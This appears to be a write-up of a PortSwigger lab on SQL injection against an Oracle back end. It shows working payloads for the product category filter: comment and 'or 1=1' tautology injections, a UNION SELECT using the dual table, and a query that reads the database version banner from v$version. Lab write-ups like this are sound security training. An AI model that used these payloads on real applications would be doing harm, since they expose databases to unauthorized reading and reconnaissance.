
# SQL injection attack, querying the database type and version on Oracle

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Hint: On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/examining-the-database

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------


We see there are 2 values displayed in the table, the description and the content of the post:


<img width="1275" height="870" alt="1" src="https://github.com/user-attachments/assets/ef92e24e-9934-4acb-b1c8-3823b4a48e81" />


We find these payload are valid to display the 4 posts in Pets and the second all the items:

```
/filter?category=Pets'--
/filter?category=Pets'+or+1=1--
```

<img width="1523" height="808" alt="2" src="https://github.com/user-attachments/assets/6df15041-6fa9-4046-a6e1-0ae3bb74b28e" />


Also, that there are 2 columns returned by the query and we can do a UNION attack with the payload:

```
/filter?category=Pets'+union+all+select+NULL,NULL+FROM+dual-- 
```


<img width="1528" height="800" alt="3" src="https://github.com/user-attachments/assets/0b688f22-4f2e-4768-a3a9-d354c76b8f80" />



We are adding the “FROM dual” because it is necessary in Oracle.

To display the version we need to execute one of these:

```
SELECT banner FROM v$version
SELECT version FROM v$instance
```

```
/filter?category=Petss'+union+all+select+'1',banner+FROM+v$version-- 
```


<img width="1534" height="788" alt="4" src="https://github.com/user-attachments/assets/3e3b6d67-da75-4221-a660-b2214d9b5bb8" />


With v$instance the server returns an error message.
